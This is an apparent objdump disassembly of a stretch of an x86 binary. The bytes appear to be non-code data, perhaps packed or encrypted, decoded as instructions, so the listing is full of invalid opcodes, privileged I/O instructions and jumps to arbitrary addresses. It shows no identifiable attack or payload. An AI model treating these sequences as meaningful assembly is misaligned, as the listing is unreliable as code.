  415ae4:	push   cs
  415ae5:	dec    eax
  415ae6:	ficomp DWORD PTR [eax]
  415ae8:	outs   dx,DWORD PTR ds:[esi]
  415ae9:	push   ds
  415aea:	sahf   
  415aeb:	mov    dl,0x9
  415aed:	je     0x415a86
  415aef:	inc    edi
  415af0:	pop    es
  415af1:	or     eax,DWORD PTR [eax-0x4487734c]
  415af7:	or     bh,BYTE PTR [edi-0x270bde0c]
  415afd:	jg     0x415b3b
  415aff:	fyl2xp1 
  415b01:	imul   esp,DWORD PTR [edx],0x45
  415b04:	cmp    ecx,DWORD PTR [ebx+0x79]
  415b07:	xor    ebp,DWORD PTR [ecx]
  415b09:	imul   DWORD PTR [edi+0x4ffeed98]
  415b0f:	or     al,BYTE PTR [eax]
	...
  415b71:	add    BYTE PTR [eax],al
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fsubr  QWORD PTR [edi+0x2857d953]
  415b85:	in     eax,0x0
  415b87:	add    BYTE PTR [ecx+eax*1],al
  415b8a:	add    BYTE PTR [eax],al
  415b8c:	sti    
  415b8d:	pop    esi
  415b8e:	les    esi,FWORD PTR [esi]
  415b90:	scas   eax,DWORD PTR es:[edi]
  415b91:	jp     0x415bf0
  415b93:	ret    0x9950
  415b96:	or     DWORD PTR [ebx],ebx
  415b98:	push   edx
  415b99:	fnstcw WORD PTR [edx]
  415b9b:	imul   eax,esp,0xaedea555
  415ba1:	add    DWORD PTR [edi+edi*1+0xc],ebp
  415ba5:	dec    edx
  415ba6:	fbld   TBYTE PTR [esi-0x7f]
  415ba9:	add    al,0x23
  415bab:	sbb    BYTE PTR [ecx-0x63e4f6c],cl
  415bb1:	push   ss
  415bb2:	mov    ds,WORD PTR [esp+edx*8-0x39]
  415bb6:	mul    DWORD PTR [edi-0x34]
  415bb9:	dec    ebx
  415bba:	(bad)  
  415bbb:	jp     0x415bf4
  415bbd:	ror    BYTE PTR [esi-0x18],0xb1
  415bc1:	push   ss
  415bc2:	mov    edi,0x5fcb2a32
  415bc7:	push   0x7b
  415bc9:	and    DWORD PTR [ebp+0x546c0bec],ebp
  415bcf:	jmp    0x8e5739f2
  415bd4:	add    eax,0xe72dfb7d
  415bd9:	movq   QWORD PTR [esi+0x22],mm2
  415bdd:	cdq    
  415bde:	repz data16 (bad) [edi-0x3bb13ce6]
  415be6:	jmp    0x415c14
  415be8:	iret   
  415be9:	cmp    esi,0xffffffe9
  415bec:	aas    
  415bed:	xchg   edx,eax
  415bee:	call   0x75df:0x386c4179
  415bf5:	sub    DWORD PTR [ebp-0x779806f3],edx
  415bfb:	xchg   ebx,eax
  415bfc:	mov    ebx,0xb4af0719
  415c01:	mov    al,0x82
  415c03:	call   0xb9e3:0x91b2b161
  415c0a:	(bad)  [edx]
  415c0c:	sbb    eax,0xf995dde2
  415c11:	pushf  
  415c12:	ds lock pop edi
  415c15:	or     eax,DWORD PTR [ecx-0x1]
  415c18:	addr16 or al,0xc3
  415c1b:	dec    edi
  415c1c:	mov    esi,0x31ca0e0c
  415c21:	mov    al,ds:0x6f203a82
  415c26:	and    edx,DWORD PTR [ebp+ecx*4-0x53]
  415c2a:	jne    0x415bf4
  415c2c:	jns    0x415c2c
  415c2e:	test   al,0x56
  415c30:	xchg   ebx,eax
  415c31:	push   ds
  415c32:	stos   DWORD PTR es:[edi],eax
  415c33:	popa   
  415c34:	rcr    ah,0xf5
  415c37:	sub    ch,BYTE PTR [ebx-0x23]
  415c3a:	enter  0x3d58,0x79
  415c3e:	popa   
  415c3f:	idiv   BYTE PTR ds:0xb3e4c53d
  415c45:	dec    ecx
  415c46:	xor    ch,BYTE PTR [edx]
  415c48:	rcr    cl,cl
  415c4a:	ins    BYTE PTR es:[edi],dx
  415c4b:	mov    bl,0x1d
  415c4d:	sti    
  415c4e:	xor    edi,DWORD PTR [eax]
  415c50:	sbb    DWORD PTR [ecx-0x6c],0xffffffaa
  415c54:	int    0xab
  415c56:	ins    DWORD PTR es:[edi],dx
  415c57:	daa    
  415c58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c59:	xor    esi,edi
  415c5b:	icebp  
  415c5c:	out    dx,eax
  415c5d:	cmp    al,0xe5
  415c5f:	cmp    al,0xdf
  415c61:	and    BYTE PTR [ecx+0x46],ch
  415c64:	jb     0x415cce
  415c66:	jp     0x415c05
  415c68:	pop    edx
  415c69:	call   0x93a1:0xb35cd37
  415c70:	or     BYTE PTR [edi+0x1a00764d],dl
  415c76:	xchg   DWORD PTR ds:0xcecbe444,ebp
  415c7c:	cbw    
  415c7e:	std    
  415c7f:	(bad)  
  415c81:	dec    ecx
  415c82:	push   eax
  415c83:	stos   BYTE PTR es:[edi],al
  415c84:	mov    cl,BYTE PTR [edx-0x20]
  415c87:	stos   DWORD PTR es:[edi],eax
  415c88:	icebp  
  415c89:	sbb    al,0xf2
  415c8b:	pop    edi
  415c8c:	pop    edx
  415c8d:	cmp    al,0x65
  415c8f:	sbb    BYTE PTR [eax],al
	...
  415cf1:	add    BYTE PTR [eax],al
  415cf3:	add    BYTE PTR [edx],bh
  415cf5:	adc    BYTE PTR [edi-0x444040c4],bh
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0xf3daea1f
  415d03:	in     al,dx
  415d04:	sub    al,0xe6
  415d06:	add    BYTE PTR [eax],al
  415d08:	add    al,0x1
  415d0a:	add    BYTE PTR [eax],al
  415d0c:	(bad)  
  415d0e:	mov    BYTE PTR [eax+0x31],bl
  415d11:	push   ds
  415d12:	xor    bl,ah
  415d14:	arpl   WORD PTR ds:0x125ea4cc,bx
  415d1a:	mov    al,ds:0xc0b77d42
  415d1f:	(bad)  
  415d21:	pop    ecx
  415d22:	xchg   ebx,eax
  415d23:	rcr    DWORD PTR [edi],cl
  415d25:	cmc    
  415d26:	mov    al,0x42
  415d28:	aas    
  415d29:	(bad)  
  415d2a:	loopne 0x415d8c
  415d2c:	pop    eax
  415d2d:	push   edi
  415d2e:	fs pop ebp
  415d30:	cmc    
  415d31:	std    
  415d32:	inc    esi
  415d33:	sbb    DWORD PTR [ebx+eax*2+0xc9da84c],edi
  415d3a:	sbb    edi,DWORD PTR [ebx+0x52]
  415d3d:	mov    ds:0xd01d67c6,al
  415d42:	stos   DWORD PTR es:[edi],eax
  415d43:	and    BYTE PTR [edx],ah
  415d45:	mov    esi,0x2ae91f8c
  415d4a:	addr16 ret 0xfb67
  415d4e:	jo     0x415da6
  415d50:	adc    DWORD PTR [ecx-0x3f],eax
  415d53:	mov    ds:0xea890e31,eax
  415d58:	pop    esp
  415d59:	adc    BYTE PTR [esi+0x7aecf75d],dh
  415d5f:	aaa    
  415d60:	pop    edi
  415d61:	iret   
  415d62:	push   ecx
  415d63:	inc    eax
  415d64:	push   0x3f3ebd82
  415d69:	imul   edi,DWORD PTR gs:[eax],0x1f
  415d6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d6e:	jl     0x415de3
  415d70:	push   edi
  415d71:	sub    BYTE PTR [ecx+esi*1+0x22],ah
  415d75:	push   ecx
  415d76:	push   ds
  415d77:	sahf   
  415d78:	xchg   esp,eax
  415d79:	add    bh,ch
  415d7b:	(bad)  
  415d7e:	xor    eax,0xccac94cf
  415d83:	xchg   edi,eax
  415d84:	cld    
  415d85:	sahf   
  415d86:	sar    DWORD PTR [eax+ebx*4],1
  415d89:	rcr    bl,1
  415d8b:	xchg   esi,eax
  415d8c:	loopne 0x415d8a
  415d8e:	or     BYTE PTR [edi-0x6f4db69b],bh
  415d94:	push   esp
  415d95:	pusha  
  415d96:	daa    
  415d97:	jmp    0xc71e:0xd9b080f2
  415d9e:	test   al,0x2f
  415da0:	push   ebp
  415da1:	push   0x1fa2fdb2
  415da6:	jg     0x415d33
  415da8:	jg     0x415df0
  415daa:	mov    al,ds:0x21a0dcfc
  415daf:	cmp    bl,BYTE PTR [edx]
  415db1:	cmp    ah,BYTE PTR ds:0xa8060a12
  415db7:	xor    BYTE PTR [eax],al
  415db9:	aad    0xa4
  415dbb:	adc    edi,esp
  415dbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415dbe:	mov    al,ds:0x68e34d7a
  415dc3:	cld    
  415dc4:	out    0x29,eax
  415dc6:	adc    BYTE PTR [ebx+edx*8],dl
  415dc9:	(bad)  
  415dcb:	(bad)  
  415dcc:	out    0x30,al
  415dce:	call   0x90bf5d07
  415dd3:	pop    edx
  415dd4:	cmp    DWORD PTR [ebx],0xffffff8a
  415dd7:	dec    edx
  415dd8:	dec    esi
  415dd9:	jns    0x415e3b
  415ddb:	popf   
  415ddc:	add    eax,0x73070942
  415de1:	or     BYTE PTR [edi-0x20010ddc],bh
  415de7:	repz inc ebp
  415de9:	mov    eax,ds:0x183cb436
  415dee:	adc    al,BYTE PTR [ebp+0x3e]
  415df1:	xchg   ecx,eax
  415df2:	mov    al,ds:0x81ad20e8
  415df7:	dec    esp
  415df8:	outs   dx,DWORD PTR ds:[esi]
  415df9:	sahf   
  415dfa:	sbb    BYTE PTR [ebx+0xe0dbcf8],0xfc
  415e01:	dec    ecx
  415e02:	xchg   edx,eax
  415e03:	and    BYTE PTR [ebx-0x40],dl
  415e06:	mov    esi,0x3f121419
  415e0b:	jp     0x415df7
  415e0d:	and    ah,ah
  415e0f:	push   ebx
	...
  415e74:	out    dx,al
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax+0x57]
  415e81:	int    0x92
  415e83:	mov    DWORD PTR [eax],esi
  415e85:	out    0x0,eax
  415e87:	add    BYTE PTR [ecx+eax*1],al
  415e8a:	add    BYTE PTR [eax],al
  415e8c:	inc    ebp
  415e8d:	or     eax,0xfee2f05d
  415e92:	xchg   ebx,eax
  415e93:	popf   
  415e94:	out    0xb9,al
  415e96:	adc    eax,0xe0ad38cc
  415e9b:	push   esp
  415e9c:	or     dl,BYTE PTR [esp+ebp*4-0xda3b36b]
  415ea3:	xlat   BYTE PTR ds:[ebx]
  415ea4:	stc    
  415ea5:	sbb    al,0x5a
  415ea7:	ins    DWORD PTR es:[edi],dx
  415ea8:	hlt    
  415ea9:	cmp    edx,DWORD PTR [ebx-0x796c38c9]
  415eaf:	pushf  
  415eb0:	fst    DWORD PTR [ebx]
  415eb2:	fwait
  415eb3:	imul   ebx,ecx,0x19
  415eb6:	xchg   cl,dh
  415eb8:	push   edx
  415eb9:	fistp  DWORD PTR [ebp-0x2084e196]
  415ebf:	stos   DWORD PTR es:[edi],eax
  415ec0:	inc    esi
  415ec1:	cli    
  415ec2:	out    0x13,eax
  415ec4:	cmp    BYTE PTR [ebx+0xf],al
  415ec7:	retf   0xdce7
  415eca:	mov    eax,0xafced6a0
  415ecf:	push   edi
  415ed0:	or     eax,0x433ffa4a
  415ed5:	mov    cl,0xad
  415ed7:	pop    esi
  415ed8:	xchg   esp,eax
  415ed9:	jecxz  0x415f2a
  415edb:	jae    0x415e6d
  415edd:	mov    ch,0x3c
  415edf:	fidiv  DWORD PTR gs:[ecx]
  415ee2:	mov    bh,0xca
  415ee4:	sbb    dh,bl
  415ee6:	out    0x45,al
  415ee8:	or     al,0x8a
  415eea:	shl    DWORD PTR [ebp+0x14],cl
  415eed:	cs push cs
  415eef:	jne    0x415e92
  415ef1:	call   0x5b447340
  415ef6:	and    bl,ah
  415ef8:	dec    esi
  415ef9:	adc    eax,0x19eea1de
  415efe:	jmp    0x415eba
  415f00:	jno    0x415eb6
  415f02:	ds loop 0x415efd
  415f05:	stos   BYTE PTR es:[di],al
  415f07:	in     al,dx
  415f08:	outs   dx,DWORD PTR ds:[esi]
  415f09:	or     dl,BYTE PTR [esi+0x2aa02b04]
  415f0f:	mov    ds:0x8e4c67af,al
  415f14:	iret   
  415f15:	jmp    0x415efa
  415f17:	mov    ds:0xfdba500b,al
  415f1c:	push   esi
  415f1d:	int3   
  415f1e:	leave  
  415f1f:	test   ecx,ebx
  415f21:	iret   
  415f22:	pop    ecx
  415f23:	jl     0x415eb3
  415f25:	sar    ecx,0x92
  415f28:	add    al,0xed
  415f2a:	jbe    0x415ef3
  415f2c:	repz pop ss
  415f2e:	dec    ebp
  415f2f:	in     eax,dx
  415f30:	xchg   edx,eax
  415f31:	bndstx [edx],(bad)
  415f34:	mov    ds:0xcbfe035f,eax
  415f39:	dec    eax
  415f3a:	mov    dh,BYTE PTR [ecx]
  415f3c:	loop   0x415fa8
  415f3e:	js     0x415fb2
  415f40:	mov    al,0x4b
  415f42:	jmp    0x704108b6
  415f47:	inc    esi
  415f48:	iret   
  415f49:	dec    esi
  415f4a:	addr16 nop
  415f4c:	cmp    edx,edx
  415f4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f4f:	in     eax,0x71
  415f51:	jl     0x415ee5
  415f53:	cld    
  415f54:	(bad)  
  415f55:	xchg   ebx,eax
  415f56:	pop    ebx
  415f57:	jl     0x415f8c
  415f59:	fsubr  QWORD PTR [ebp-0x2e77d891]
  415f5f:	ss fwait
  415f61:	into   
  415f62:	mov    ebx,0xcc45df75
  415f67:	aaa    
  415f68:	jns    0x415ef5
  415f6a:	scas   eax,DWORD PTR es:[edi]
  415f6b:	sbb    dh,dl
  415f6d:	loopne 0x415f40
  415f6f:	add    BYTE PTR [esi+0x72882eab],cl
  415f75:	or     ah,BYTE PTR [eax]
  415f77:	sub    eax,0x56303e0c
  415f7c:	adc    eax,0xb81df6b1
  415f81:	aaa    
  415f82:	dec    ecx
  415f83:	aaa    
  415f84:	dec    ecx
  415f85:	xor    DWORD PTR [ecx],esi
  415f87:	sub    esp,DWORD PTR [ebp+ebx*4-0x22]
  415f8b:	mov    fs,WORD PTR [edx+0x41]
  415f8e:	loop   0x415f9e
	...
  415ff4:	pop    ss
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	sar    BYTE PTR [edx],0x81
  416003:	dec    eax
  416004:	xor    al,0xe8
  416006:	add    BYTE PTR [eax],al
  416008:	add    al,0x1
  41600a:	add    BYTE PTR [eax],al
  41600c:	xchg   ebx,eax
  41600d:	cmp    al,0xcd
  41600f:	pusha  
  416010:	int3   
  416011:	cmp    dh,BYTE PTR [eax]
  416013:	cmp    DWORD PTR [edi+0x6f],0x3f
  416017:	cmp    bl,BYTE PTR [ebx-0x203471ae]
  41601d:	adc    al,0x25
  41601f:	mov    ds:0x74cf606d,al
  416024:	pop    esp
  416025:	in     eax,dx
  416026:	sbb    dl,BYTE PTR [ecx-0x6e]
  416029:	jbe    0x415fc5
  41602b:	mov    ds:0xf8bdf90e,eax
  416030:	cmp    al,0xe
  416033:	outs   dx,BYTE PTR ds:[esi]
  416034:	mov    ebp,0x1d8a16c7
  416039:	shr    BYTE PTR ds:0x8522a087,1
  41603f:	mov    esp,0x59aa80cb
  416044:	sub    BYTE PTR [ebx+0x61d5891b],cl
  41604a:	loopne 0x4160a9
  41604c:	and    al,0xf
  41604e:	inc    DWORD PTR [edx-0x5dc4a97a]
  416054:	jmp    0x50530328
  416059:	loope  0x416063
  41605b:	pop    ebp
  41605c:	ins    BYTE PTR es:[edi],dx
  41605d:	ror    BYTE PTR [ebx-0x2a1528c0],0xc0
  416064:	outs   dx,DWORD PTR ds:[esi]
  416065:	test   al,0x6d
  416067:	ja     0x416072
  416069:	jg     0x416012
  41606b:	test   eax,edx
  41606d:	mov    ah,0xab
  41606f:	fwait
  416070:	xlat   BYTE PTR ds:[ebx]
  416071:	push   ebx
  416072:	xor    edi,DWORD PTR [esi-0x40d0bb1d]
  416078:	mov    ch,0xe
  41607a:	inc    eax
  41607b:	adc    ecx,ebx
  41607d:	shl    BYTE PTR [edx],cl
  41607f:	pop    es
  416080:	lods   al,BYTE PTR ds:[esi]
  416081:	sub    dh,ah
  416083:	mov    al,0x3b
  416085:	xchg   BYTE PTR [ecx],al
  416087:	mov    ebp,0xba3fe055
  41608c:	call   0x2cd0:0x663e12e7
  416093:	dec    ebp
  416094:	dec    edi
  416095:	cmp    DWORD PTR [ebp+0x7c],eax
  416098:	fadd   DWORD PTR [ebp-0x58]
  41609b:	fwait
  41609c:	pop    ebx
  41609d:	dec    eax
  41609e:	inc    esi
  41609f:	outs   dx,BYTE PTR ds:[esi]
  4160a0:	adc    BYTE PTR [esp+ecx*1-0x5b33c53a],dl
  4160a7:	mov    esi,0xf3e956a0
  4160ac:	jae    0x4160a5
  4160ae:	stos   BYTE PTR es:[edi],al
  4160af:	test   al,0x1c
  4160b1:	lock push ds
  4160b3:	cmp    dl,dl
  4160b5:	nop
  4160b6:	push   es
  4160b7:	cmp    DWORD PTR [eax-0x33],edx
  4160ba:	jns    0x41613b
  4160bc:	mov    esi,0xfd541981
  4160c1:	shr    DWORD PTR [ebx-0x43],cl
  4160c4:	fwait
  4160c5:	lds    ebp,FWORD PTR [edi+0x13]
  4160c8:	xor    BYTE PTR [eax+0x2b],ch
  4160cb:	in     eax,0x25
  4160cd:	mov    al,0x87
  4160cf:	pop    ecx
  4160d0:	add    eax,0xb1e295f3
  4160d5:	jecxz  0x416088
  4160d7:	mov    fs,edi
  4160d9:	mov    al,0xd4
  4160db:	call   FWORD PTR [ebx+0x61]
  4160de:	ins    DWORD PTR es:[edi],dx
  4160df:	fdivr  DWORD PTR [ecx-0x3f426fb5]
  4160e5:	cmp    ebp,DWORD PTR [ecx-0x7e851ccc]
  4160eb:	das    
  4160ec:	fcomi  st,st(6)
  4160ee:	jmp    0x280599f9
  4160f3:	fcomp  QWORD PTR [edx*8-0x4e0af9ba]
  4160fa:	jl     0x4160c7
  4160fc:	pop    esi
  4160fd:	xchg   eax,eax
  4160ff:	or     cl,al
  416101:	pushf  
  416102:	dec    edx
  416103:	aad    0x56
  416105:	cdq    
  416106:	and    ebp,DWORD PTR [ecx-0x16]
  416109:	outs   dx,DWORD PTR ds:[esi]
  41610a:	push   eax
  41610b:	mov    eax,0x2cd65791
	...
  416174:	and    cl,ch
  416176:	cmp    ebx,esi
  416178:	sti    
  416179:	fsubrp st(5),st
  41617b:	inc    esi
  41617d:	push   edx
  41617e:	sub    eax,0x92f069f3
  416183:	ja     0x4161bd
  416185:	jmp    0x145618a
  41618a:	add    BYTE PTR [eax],al
  41618c:	sub    esp,DWORD PTR [esi+0x2ba9b866]
  416192:	or     DWORD PTR [ecx+eax*2],edx
  416195:	arpl   WORD PTR [edi-0x1ef805a6],bp
  41619b:	inc    ecx
  41619c:	pop    ebx
  41619d:	or     dl,BYTE PTR [ecx+0x1c]
  4161a0:	stos   BYTE PTR es:[edi],al
  4161a1:	xchg   edx,eax
  4161a2:	mov    cl,0x8a
  4161a4:	stc    
  4161a5:	lods   al,BYTE PTR ds:[esi]
  4161a6:	mov    ch,0xb4
  4161a8:	adc    edx,DWORD PTR [edx-0x68]
  4161ab:	add    ah,0xa3
  4161ae:	xchg   ebx,eax
  4161af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161b0:	jbe    0x416210
  4161b2:	ds push ecx
  4161b4:	jmp    0x94df:0x1c81e75a
  4161bb:	inc    esi
  4161bc:	in     al,0xa5
  4161be:	aam    0x47
  4161c0:	and    ecx,DWORD PTR [edx+0x16]
  4161c3:	jb     0x4161a1
  4161c5:	pop    gs
  4161c7:	mov    ch,0x2f
  4161c9:	loop   0x41614c
  4161cb:	es in  al,0x93
  4161ce:	imul   DWORD PTR [edx-0x1b12331b]
  4161d4:	test   dh,0xdc
  4161d7:	jp     0x4161e2
  4161d9:	pop    edx
  4161da:	mov    WORD PTR [ebx-0xb],gs
  4161dd:	test   BYTE PTR [esi],bh
  4161df:	pop    edx
  4161e0:	mov    eax,0x65898df5
  4161e5:	cmp    esi,DWORD PTR [ebp-0x69ee19e9]
  4161eb:	push   es
  4161ec:	adc    DWORD PTR [edx+0x7e038fca],0x42f0450d
  4161f6:	out    dx,al
  4161f7:	jmp    0x41623a
  4161f9:	in     eax,0xf4
  4161fb:	cmp    DWORD PTR [ebp-0xb],ebx
  4161fe:	cli    
  4161ff:	retf   0x8bcf
  416202:	and    ah,bh
  416204:	out    dx,al
  416205:	ja     0x4161d0
  416207:	mov    DWORD PTR [ecx+edi*8],ebp
  41620a:	mov    edi,0xdcface5a
  41620f:	icebp  
  416210:	aaa    
  416211:	fidivr WORD PTR [edx]
  416213:	stos   BYTE PTR es:[edi],al
  416214:	push   esi
  416215:	or     bl,BYTE PTR [ecx+ebx*2+0x15016cb]
  41621c:	xchg   esi,eax
  41621d:	mov    ah,BYTE PTR [ebx-0x4ff9658e]
  416223:	jmp    DWORD PTR [ebp+0x5d]
  416226:	cdq    
  416227:	repnz sbb BYTE PTR [ebp+0xb],0x35
  41622c:	enter  0x53a9,0x3b
  416230:	cmp    cl,BYTE PTR [esi-0x37]
  416233:	out    0xad,al
  416235:	xchg   edx,eax
  416236:	sti    
  416237:	add    eax,0x2ffd513c
  41623c:	sbb    eax,0x68f0578e
  416241:	out    0xce,eax
  416243:	mov    ebx,0xad793c2
  416248:	fs push 0xfffffff8
  41624b:	call   0x401e:0x91e116bb
  416252:	leave  
  416253:	mov    al,ds:0xfdc8bdb4
  416258:	in     al,0xef
  41625a:	sbb    edx,eax
  41625c:	cmp    al,BYTE PTR [ebp-0x11435aea]
  416262:	inc    ebx
  416263:	ja     0x416230
  416265:	sbb    al,0xe1
  416267:	popa   
  416268:	cmp    ch,BYTE PTR [ebx]
  41626a:	push   cs
  41626b:	fnstsw WORD PTR [esi+0x1a930ddc]
  416271:	mov    ds:0xea66b36f,al
  416276:	test   BYTE PTR [edx+ebx*2],ah
  416279:	jmp    0x416248
  41627b:	mov    WORD PTR [esi-0x29],?
  41627e:	dec    ebp
  41627f:	out    0x5e,al
  416281:	pop    ebp
  416282:	leave  
  416283:	xor    eax,0xeb2d1cd8
  416288:	sub    DWORD PTR [ebp-0x15],esp
  41628b:	aas    
  41628c:	ja     0x4162c2
  41628e:	push   ebx
  41628f:	add    eax,0x0
	...
  4162f4:	and    ebp,DWORD PTR [esi+0x32]
  4162f7:	and    eax,0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x3ce0:0x713570ee
  416305:	jmp    0x0:0x1040000
  41630c:	popf   
  41630d:	dec    ebp
  41630e:	and    dl,BYTE PTR [ecx+0x3b]
  416311:	mov    eax,ds:0xb3c132f7
  416316:	mov    WORD PTR [edx],fs
  416318:	or     eax,0xfb25c1e2
  41631d:	jp     0x416324
  41631f:	fwait
  416320:	xchg   esi,eax
  416321:	xor    esi,esp
  416323:	loopne 0x4162db
  416325:	ds in  al,dx
  416327:	sbb    BYTE PTR cs:[esi+0x7f],dh
  41632b:	jb     0x4162e0
  41632d:	adc    eax,0xfd23a00f
  416332:	and    eax,eax
  416334:	xchg   ebp,eax
  416335:	rol    DWORD PTR [ecx-0x22],1
  416338:	and    BYTE PTR [ecx+ebp*4-0x7c],cl
  41633c:	mov    bh,0x3d
  41633e:	jbe    0x416343
  416340:	loop   0x416370
  416342:	addr16 xor eax,0xc98a5bf9
  416348:	xchg   ebx,eax
  416349:	jge    0x416369
  41634b:	and    al,0x28
  41634d:	mov    ebx,0x9dfaff5e
  416352:	pop    ss
  416353:	repz fdiv QWORD PTR [edx+0x4c6b88d7]
  41635a:	jl     0x41632f
  41635c:	fst    DWORD PTR [eax]
  41635e:	pop    eax
  41635f:	mov    esp,0xca30f54c
  416364:	repz mov al,0xf
  416367:	js     0x416323
  416369:	mov    ds:0x8f2e7d8e,al
  41636e:	ret    
  41636f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416370:	outs   dx,DWORD PTR ds:[esi]
  416371:	lahf   
  416372:	add    esi,edi
  416374:	and    BYTE PTR [ebp+0x4b],dl
  416377:	xor    bh,BYTE PTR [eax-0x6d]
  41637a:	lahf   
  41637b:	pop    es
  41637c:	iret   
  41637d:	pop    ss
  41637e:	push   esp
  41637f:	push   esi
  416380:	clc    
  416381:	dec    edx
  416382:	enter  0xde9d,0x22
  416386:	es ret 0xdb5b
  41638a:	cmp    ecx,DWORD PTR [esi+ebx*2]
  41638d:	cmp    DWORD PTR [edi-0x9],edx
  416390:	pop    edx
  416391:	add    esp,esp
  416393:	test   BYTE PTR [edi],bl
  416395:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416396:	cmp    al,0x2
  416398:	call   0x95ad:0x28b5769a
  41639f:	mov    dh,0xb4
  4163a1:	je     0x416394
  4163a3:	sbb    al,bl
  4163a5:	pop    esi
  4163a6:	mov    ds:0x20332b23,al
  4163ab:	xchg   esi,eax
  4163ac:	test   eax,0x54db8d45
  4163b1:	scas   eax,DWORD PTR es:[edi]
  4163b2:	cmc    
  4163b3:	and    eax,0x351812f5
  4163b8:	les    ecx,FWORD PTR [ebp+0x5e]
  4163bb:	cld    
  4163bc:	clc    
  4163bd:	aad    0x61
  4163bf:	pop    es
  4163c0:	xor    DWORD PTR [ecx],esi
  4163c2:	xchg   BYTE PTR [eax+0x682ffce3],cl
  4163c8:	xchg   ecx,eax
  4163c9:	lds    edi,FWORD PTR [ecx]
  4163cb:	sub    edx,DWORD PTR [eax]
  4163cd:	push   ebx
  4163ce:	push   ds
  4163cf:	nop
  4163d0:	mov    gs,WORD PTR [esp+ebp*2+0x35]
  4163d4:	fidivr WORD PTR [ebx+0x7c]
  4163d7:	stos   DWORD PTR es:[edi],eax
  4163d8:	fadd   st(5),st
  4163da:	data16 sbb BYTE PTR [edx],al
  4163dd:	imul   ebp,DWORD PTR [ebp-0x41d91b77],0x3a0134ed
  4163e7:	push   ds
  4163e8:	sub    ch,dl
  4163ea:	scas   al,BYTE PTR es:[edi]
  4163eb:	sar    DWORD PTR [ebx-0x4a70f016],0x49
  4163f2:	out    0x5f,al
  4163f4:	in     eax,0x87
  4163f6:	cmp    eax,edx
  4163f8:	dec    edi
  4163f9:	mov    ebp,0x77fc6363
  4163fe:	cli    
  4163ff:	sub    ch,BYTE PTR [esi+0x5a897019]
  416405:	jp     0x416426
  416407:	fstp   TBYTE PTR ds:0x4a2710ec
  41640d:	cmp    eax,0xbd06
	...
  416472:	add    BYTE PTR [eax],al
  416474:	repz inc ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	xchg   ebp,eax
  416481:	(bad)  
  416483:	pop    edx
  416484:	inc    eax
  416485:	jmp    0x416487
  416487:	add    BYTE PTR [ecx+eax*1],al
  41648a:	add    BYTE PTR [eax],al
  41648c:	addr16 sbb al,0xa1
  41648f:	lods   eax,DWORD PTR ds:[esi]
  416490:	pop    ebp
  416491:	sbb    al,0x67
  416493:	xlat   BYTE PTR ds:[ebx]
  416494:	pusha  
  416495:	cmp    al,0xf7
  416497:	pop    es
  416498:	shr    DWORD PTR [ebp+0x6f],cl
  41649b:	enter  0x44d8,0x64
  41649f:	fsub   QWORD PTR [edx]
  4164a1:	ja     0x41643d
  4164a3:	jmp    0xa8b6e167
  4164a8:	mov    BYTE PTR [esi+0x6a],dh
  4164ab:	sbb    cl,BYTE PTR [esi+0x56]
  4164ae:	inc    esi
  4164af:	pop    ds
  4164b0:	pop    edi
  4164b1:	xor    al,0x8e
  4164b3:	sar    DWORD PTR [ecx+0xe],0x3c
  4164b7:	cmp    eax,0x60e4cca9
  4164bc:	xor    BYTE PTR [ebx],bl
  4164be:	jmp    0x28a35142
  4164c3:	fnsave [ebx-0x7d]
  4164c6:	push   esi
  4164c7:	jbe    0x41646b
  4164c9:	inc    ebx
  4164ca:	jge    0x4164e1
  4164cc:	scas   eax,DWORD PTR es:[edi]
  4164cd:	sub    bh,BYTE PTR [edx-0x4a2284c0]
  4164d3:	push   0xecac8eb
  4164d8:	mov    cl,0xc4
  4164da:	cmp    al,0x2d
  4164dc:	(bad)  
  4164dd:	int    0x9c
  4164df:	repz xchg bp,ax
  4164e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164e3:	cmp    ch,BYTE PTR [edi+0x1c]
  4164e6:	push   ebp
  4164e7:	lock sub eax,DWORD PTR [esi-0x37]
  4164eb:	mov    bl,0x78
  4164ed:	xchg   esi,eax
  4164ee:	sub    DWORD PTR [ebp-0x5ffde0bf],esi
  4164f4:	shl    BYTE PTR [eax],cl
  4164f6:	retf   
  4164f7:	shl    BYTE PTR [eax+0x6f],1
  4164fa:	jge    0x41649d
  4164fc:	scas   eax,DWORD PTR es:[edi]
  4164fd:	test   al,0x83
  4164ff:	aas    
  416500:	mov    bh,0x63
  416502:	enter  0x6eb7,0x6
  416506:	push   ss
  416507:	cmc    
  416508:	mov    cl,BYTE PTR [ebx]
  41650a:	inc    esi
  41650b:	inc    ebp
  41650c:	scas   eax,DWORD PTR es:[edi]
  41650d:	push   es
  41650e:	inc    eax
  41650f:	js     0x41652d
  416511:	gs cdq 
  416513:	sar    dh,1
  416515:	xchg   ebx,eax
  416516:	cli    
  416517:	dec    edx
  416518:	out    dx,al
  416519:	jae    0x4164c2
  41651b:	je     0x416548
  41651d:	or     BYTE PTR [edx+edx*4],cl
  416520:	xor    DWORD PTR [eax-0x2317a153],ebp
  416526:	aad    0x6d
  416528:	loopne 0x4164c1
  41652a:	test   al,0xed
  41652c:	scas   eax,DWORD PTR es:[edi]
  41652d:	nop
  41652e:	sub    DWORD PTR ds:0xff70a2b4,ebx
  416534:	aad    0xe5
  416536:	add    al,0x95
  416538:	into   
